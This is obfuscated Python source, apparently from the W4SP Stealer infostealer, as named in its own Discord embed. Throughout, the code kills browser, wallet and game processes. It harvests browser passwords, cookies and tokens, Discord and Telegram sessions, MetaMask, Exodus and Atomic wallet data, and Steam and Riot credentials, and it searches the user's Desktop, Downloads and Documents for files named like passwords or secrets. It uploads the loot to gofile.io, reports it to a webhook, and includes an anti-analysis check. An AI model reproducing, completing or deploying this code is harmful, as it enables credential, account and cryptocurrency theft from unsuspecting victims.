    OO000OOO0O000O00O =threading .Thread (target =ZipTelegram ,args =[OO0OOOO00000OOOO0 [0 ],OO0OOOO00000OOOO0 [2 ],OO0OOOO00000OOOO0 [1 ]])#line:579
    OO000OOO0O000O00O .start ()#line:580
    O0OOO000000OO0OO0 .append (OO000OOO0O000O00O )#line:581
    for OO0OO0OOO00OOOO00 in O0OOO000000OO0OO0 :#line:583
        OO0OO0OOO00OOOO00 .join ()#line:584
    global WalletsZip ,GamingZip ,OtherZip #line:585
    O000O0OO0O00OO000 ,OO0O0O0OO0000OOOO ,O0O0O0OOO0OOOOOOO ="",'',''#line:586
    if len (WalletsZip )!=0 :#line:587
        O000O0OO0O00OO000 =":coin:  •  Wallets\n"#line:588
        for O0O00OO000OOOOOO0 in WalletsZip :#line:589
            O000O0OO0O00OO000 +=f"└─ [{O0O00OO000OOOOOO0[0]}]({O0O00OO000OOOOOO0[1]})\n"#line:590
    if len (GamingZip )!=0 :#line:591
        OO0O0O0OO0000OOOO =":video_game:  •  Gaming:\n"#line:592
        for O0O00OO000OOOOOO0 in GamingZip :#line:593
            OO0O0O0OO0000OOOO +=f"└─ [{O0O00OO000OOOOOO0[0]}]({O0O00OO000OOOOOO0[1]})\n"#line:594
    if len (OtherZip )!=0 :#line:595
        O0O0O0OOO0OOOOOOO =":tickets:  •  Apps\n"#line:596
        for O0O00OO000OOOOOO0 in OtherZip :#line:597
            O0O0O0OOO0OOOOOOO +=f"└─ [{O0O00OO000OOOOOO0[0]}]({O0O00OO000OOOOOO0[1]})\n"#line:598
    OOOOO00O0OOO0000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:602
    OOOO000O000OOO0OO ={"content":globalInfo (),"embeds":[{"title":"W4SP Zips","description":f"{O000O0OO0O00OO000}\n{OO0O0O0OO0000OOOO}\n{O0O0O0OOO0OOOOOOO}","color":15781403 ,"footer":{"text":"@W4SP STEALER","icon_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"}}],"username":"W4SP Stealer","avatar_url":"https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png","attachments":[]}#line:620
    LoadUrlib (hook ,data =dumps (OOOO000O000OOO0OO ).encode (),headers =OOOOO00O0OOO0000O )#line:621
def ZipTelegram (OOOO0O00O0000OO0O ,OOOOOOOOO00OOO000 ,OO0000O000O00O0OO ):#line:624
    global OtherZip #line:625
    OOO0O0000O000OO0O =OOOO0O00O0000OO0O #line:626
    O0OOOO0O00OO000O0 =OOOOOOOOO00OOO000 #line:627
    if not os .pathC .exists (OOO0O0000O000OO0O ):return #line:628
    subprocess .Popen (f"taskkill /im {OO0000O000O00O0OO} /t /f >nul 2>&1",shell =True )#line:629
    O00OOOO00OO000OO0 =ZipFile (f"{OOO0O0000O000OO0O}/{O0OOOO0O00OO000O0}.zip","w")#line:631
    for O0O0OO00OOO0O0000 in os .listdir (OOO0O0000O000OO0O ):#line:632
        if (".zip"not in O0O0OO00OOO0O0000 and "tdummy"not in O0O0OO00OOO0O0000 and "user_data"not in O0O0OO00OOO0O0000 and "webview"not in O0O0OO00OOO0O0000 ):#line:638
            O00OOOO00OO000OO0 .write (f"{OOO0O0000O000OO0O}/{O0O0OO00OOO0O0000}")#line:639
    O00OOOO00OO000OO0 .close ()#line:640
    OO000O0OOOOO00O0O =uploadToAnonfiles (f'{OOO0O0000O000OO0O}/{O0OOOO0O00OO000O0}.zip')#line:642
    os .remove (f"{OOO0O0000O000OO0O}/{O0OOOO0O00OO000O0}.zip")#line:644
    OtherZip .append ([OOOOOOOOO00OOO000 ,OO000O0OOOOO00O0O ])#line:645
def ZipThings (OOO00000OOOOO0O00 ,O000O00OO000OOO0O ,O0OO00OO0OOOO0000 ):#line:647
    O0O0OO00O0000OO00 =OOO00000OOOOO0O00 #line:648
    OO0OO000OOOO00000 =O000O00OO000OOO0O #line:649
    global WalletsZip ,GamingZip ,OtherZip #line:650
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O000O00OO000OOO0O :#line:654
        O000OO00O0O0OO0O0 =OOO00000OOOOO0O00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:655
        OO0OO000OOOO00000 =f"Metamask_{O000OO00O0O0OO0O0}"#line:656
        O0O0OO00O0000OO00 =OOO00000OOOOO0O00 +O000O00OO000OOO0O #line:657
    if not os .path .exists (O0O0OO00O0000OO00 ):return #line:659
    subprocess .Popen (f"taskkill /im {O0OO00OO0OOOO0000} /t /f >nul 2>&1",shell =True )#line:660
    if "Wallet"in O000O00OO000OOO0O or "NationsGlory"in O000O00OO000OOO0O :#line:662
        O000OO00O0O0OO0O0 =OOO00000OOOOO0O00 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:663
        OO0OO000OOOO00000 =f"{O000OO00O0O0OO0O0}"#line:664
    elif "Steam"in O000O00OO000OOO0O :#line:666
        if not os .path .isfile (f"{O0O0OO00O0000OO00}/loginusers.vdf"):return #line:667
        O0OO000OOOOO0O000 =open (f"{O0O0OO00O0000OO00}/loginusers.vdf","r+",encoding ="utf8")#line:668
        O0O0O0OO00O00O0O0 =O0OO000OOOOO0O000 .readlines ()#line:669
        OOOO0O0000OOO0000 =any ('RememberPassword"\t\t"1"'in OO0000OOO00OOOOOO for OO0000OOO00OOOOOO in O0O0O0OO00O00O0O0 )#line:670
        if not OOOO0O0000OOO0000 :return #line:671
        OO0OO000OOOO00000 =O000O00OO000OOO0O #line:672
    OOOOOOOOO0O0000O0 =ZipFile (f"{O0O0OO00O0000OO00}/{OO0OO000OOOO00000}.zip","w")#line:675
    for O00OOOO000OO00O00 in os .listdir (O0O0OO00O0000OO00 ):#line:676
        if ".zip"not in O00OOOO000OO00O00 :#line:677
            OOOOOOOOO0O0000O0 .write (f"{O0O0OO00O0000OO00}/{O00OOOO000OO00O00}")#line:678
    OOOOOOOOO0O0000O0 .close ()#line:679
    OOO000OO00O00OO0O =uploadToAnonfiles (f'{O0O0OO00O0000OO00}/{OO0OO000OOOO00000}.zip')#line:681
    os .remove (f"{O0O0OO00O0000OO00}/{OO0OO000OOOO00000}.zip")#line:683
    if "Wallet"in O000O00OO000OOO0O or "eogaeaoehlef"in O000O00OO000OOO0O :#line:685
        WalletsZip .append ([OO0OO000OOOO00000 ,OOO000OO00O00OO0O ])#line:686
    elif "NationsGlory"in OO0OO000OOOO00000 or "Steam"in OO0OO000OOOO00000 or "RiotCli"in OO0OO000OOOO00000 :#line:687
        GamingZip .append ([OO0OO000OOOO00000 ,OOO000OO00O00OO0O ])#line:688
    else :#line:689
        OtherZip .append ([OO0OO000OOOO00000 ,OOO000OO00O00OO0O ])#line:690
def GatherAll ():#line:693
    ""#line:694
    OOOOO00OOO0O00OOO =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:704
    OO00O000O0000O0OO =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:711
    OOOO0O0O0OO0OOO0O =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:719
    O000000OOOO0000O0 =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:720
    for O000OO00OO00OO0OO in OOOOO00OOO0O00OOO :#line:722
        O0O00OOOO00O0O00O =threading .Thread (target =getToken ,args =[O000OO00OO00OO0OO [0 ],O000OO00OO00OO0OO [2 ]])#line:723
        O0O00OOOO00O0O00O .start ()#line:724
        Threadlist .append (O0O00OOOO00O0O00O )#line:725
    for O000OO00OO00OO0OO in OO00O000O0000O0OO :#line:726
        O0O00OOOO00O0O00O =threading .Thread (target =GetDiscord ,args =[O000OO00OO00OO0OO [0 ],O000OO00OO00OO0OO [1 ]])#line:727
        O0O00OOOO00O0O00O .start ()#line:728
        Threadlist .append (O0O00OOOO00O0O00O )#line:729
    for O000OO00OO00OO0OO in OOOOO00OOO0O00OOO :#line:731
        O0O00OOOO00O0O00O =threading .Thread (target =getPassw ,args =[O000OO00OO00OO0OO [0 ],O000OO00OO00OO0OO [3 ]])#line:732
        O0O00OOOO00O0O00O .start ()#line:733
        Threadlist .append (O0O00OOOO00O0O00O )#line:734
    OO00O0O00OO0O0O00 =[]#line:736
    for O000OO00OO00OO0OO in OOOOO00OOO0O00OOO :#line:737
        O0O00OOOO00O0O00O =threading .Thread (target =getCookie ,args =[O000OO00OO00OO0OO [0 ],O000OO00OO00OO0OO [4 ]])#line:738
        O0O00OOOO00O0O00O .start ()#line:739
        OO00O0O00OO0O0O00 .append (O0O00OOOO00O0O00O )#line:740
    threading .Thread (target =GatherZips ,args =[OOOOO00OOO0O00OOO ,OOOO0O0O0OO0OOO0O ,O000000OOOO0000O0 ]).start ()#line:742
    for OO0OO0OO00OOOOOO0 in OO00O0O00OO0O0O00 :OO0OO0OO00OOOOOO0 .join ()#line:745
    O0O000O0OOOO00000 =Trust (Cookies )#line:746
    if O0O000O0OOOO00000 ==True :return #line:747
    for OO0OO0OO00OOOOOO0 in Threadlist :#line:757
        OO0OO0OO00OOOOOO0 .join ()#line:758
    global upths #line:759
    upths =[]#line:760
    for OOOOO0OO00O0OO0OO in ["wppassw.txt","wpcook.txt"]:#line:762
        upload (OOOOO0OO00O0OO0OO .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OOOOO0OO00O0OO0OO ))#line:764
def uploadToAnonfiles (O000OOOOOO0O0O000 ):#line:766
    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O000OOOOOO0O0O000 ,'rb')}).json ()["data"]["downloadPage"]#line:767
    except :return False #line:768
def KiwiFolder (OOOOOOO0O00O0OO00 ,OO0OOO000O0OOOO0O ):#line:779
    global KiwiFiles #line:780
    O00O00O0OO00OOOO0 =7 #line:781
    O0O0O0000OO0OO0O0 =0 #line:782
    OOO0OO0OO0O0000O0 =os .listdir (OOOOOOO0O00O0OO00 )#line:783
    OOO00O0OOO0OOO0O0 =[]#line:784
    for O0OOOOOOO000000O0 in OOO0OO0OO0O0000O0 :#line:785
        if not os .path .isfile (f"{OOOOOOO0O00O0OO00}/{O0OOOOOOO000000O0}"):return #line:786
        O0O0O0000OO0OO0O0 +=1 #line:787
        if O0O0O0000OO0OO0O0 >O00O00O0OO00OOOO0 :#line:788
            break #line:789
        O0OOOO000OOOO0OOO =uploadToAnonfiles (f"{OOOOOOO0O00O0OO00}/{O0OOOOOOO000000O0}")#line:790
        OOO00O0OOO0OOO0O0 .append ([f"{OOOOOOO0O00O0OO00}/{O0OOOOOOO000000O0}",O0OOOO000OOOO0OOO ])#line:791
    KiwiFiles .append (["folder",f"{OOOOOOO0O00O0OO00}/",OOO00O0OOO0OOO0O0 ])#line:792
KiwiFiles =[]#line:794
def KiwiFile (O00OO0OOO0O0OOO0O ,OO00OO0OOO0O0OO0O ):#line:795
    global KiwiFiles #line:796
    OOOOO0O00O0O0000O =[]#line:797
    O0O0OOO0O000OOO00 =os .listdir (O00OO0OOO0O0OOO0O )#line:798
    for OO000O00O00OOOO0O in O0O0OOO0O000OOO00 :#line:799
        for O00O0000OOO000OOO in OO00OO0OOO0O0OO0O :#line:800
            if O00O0000OOO000OOO in OO000O00O00OOOO0O .lower ():#line:801
                if os .path .isfile (f"{O00OO0OOO0O0OOO0O}/{OO000O00O00OOOO0O}")and ".txt"in OO000O00O00OOOO0O :#line:802
                    OOOOO0O00O0O0000O .append ([f"{O00OO0OOO0O0OOO0O}/{OO000O00O00OOOO0O}",uploadToAnonfiles (f"{O00OO0OOO0O0OOO0O}/{OO000O00O00OOOO0O}")])#line:803
                    break #line:804
                if os .path .isdir (f"{O00OO0OOO0O0OOO0O}/{OO000O00O00OOOO0O}"):#line:805
                    O0OOO0O00OO00O00O =f"{O00OO0OOO0O0OOO0O}/{OO000O00O00OOOO0O}"#line:806
                    KiwiFolder (O0OOO0O00OO00O00O ,OO00OO0OOO0O0OO0O )#line:807
                    break #line:808
    KiwiFiles .append (["folder",O00OO0OOO0O0OOO0O ,OOOOO0O00O0O0000O ])#line:810
def Kiwi ():#line:812
    O0O0000O0OOOOOO0O =temp .split ("\AppData")[0 ]#line:813
    OO00O00OOOO0O0OOO =[f"{O0O0000O0OOOOOO0O}/Desktop",f"{O0O0000O0OOOOOO0O}/Downloads",f"{O0O0000O0OOOOOO0O}/Documents"]#line:814
    O0000O0O000OO0O00 =["account","acount","passw","secret"]#line:822
    O0OOO00OOO0O00000 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret"]#line:848
    OO0OOOOOO00OOO000 =[]#line:850
    for OOO00000O00O00OOO in OO00O00OOOO0O0OOO :#line:851
        O0O0O0OOOO000O0OO =threading .Thread (target =KiwiFile ,args =[OOO00000O00O00OOO ,O0OOO00OOO0O00000 ]);O0O0O0OOOO000O0OO .start ()#line:852
        OO0OOOOOO00OOO000 .append (O0O0O0OOOO000O0OO )#line:853
    return OO0OOOOOO00OOO000 #line:854
global keyword ,cookiWords ,paswWords ,CookiCount ,PasswCount ,WalletsZip ,GamingZip ,OtherZip #line:857
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:861
CookiCount ,PasswCount =0 ,0 #line:863
cookiWords =[]#line:864
paswWords =[]#line:865
WalletsZip =[]#line:867
GamingZip =[]#line:868
OtherZip =[]#line:869
GatherAll ()#line:871
DETECTED =Trust (Cookies )#line:872
if not DETECTED :#line:874
    wikith =Kiwi ()#line:875
    for thread in wikith :thread .join ()#line:877
    time .sleep (0.2 )#line:878
    filetext ="\n"#line:880
    for arg in KiwiFiles :#line:881
        if len (arg [2 ])!=0 :#line:882
            foldpath =arg [1 ]#line:883
            foldlist =arg [2 ]#line:884
            filetext +=f"📁 {foldpath}\n"#line:885
            for ffil in foldlist :#line:887
                a =ffil [0 ].split ("/")#line:888
                fileanme =a [len (a )-1 ]#line:889
                b =ffil [1 ]#line:890
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:891
            filetext +="\n"#line:892
    upload ("kiwi",filetext )